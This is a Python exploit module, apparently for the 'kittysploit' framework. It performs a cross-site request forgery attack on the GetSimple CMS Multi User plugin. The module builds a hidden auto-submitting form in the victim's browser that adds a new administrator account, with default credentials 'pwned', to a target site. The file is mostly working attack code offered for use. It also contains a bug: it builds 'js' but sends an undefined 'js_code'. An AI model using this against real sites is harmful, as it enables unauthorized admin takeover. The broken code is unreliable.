from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "GetSimple CMS 1.6 csrf",
		"description": "GetSimple CMS Plugin Multi User v1.8.2 - Cross-Site Request Forgery (Add Admin)",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target URL (with http://)", required=True)
	username = OptString("pwned", "Add username", required=True)
	password = OptString("pwned", "Choose password", required=True)

	
	def run(self):
		data = [f'<form method="POST" action="{self.target}/admin/load.php?id=user-managment">',
			f'<input type="hidden" name="usernamec" value="{self.username}" />',
			f'<input type="hidden" name="useremail" value="ADMIN&#64;DOMAIN&#46;LOCAL" />',
			f'<input type="hidden" name="ntimezone" value="" />',
			f'<input type="hidden" name="userlng" value="en&#95;US" />',
			f'<input type="hidden" name="userpassword" value="{self.password}" />',
			f'<input type="hidden" name="usereditor" value="1" />',
			f'<input type="hidden" name="Landing" value="" />',
			f' <input type="hidden" name="add&#45;user" value="Add&#32;New&#32;User" />',
			'</form>']
			
		js = self.csrf_post_and_submit(data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Admin creation request sent: {self.username}")
			return True
		else:
			fail.CSRFPostFailed()
		return False
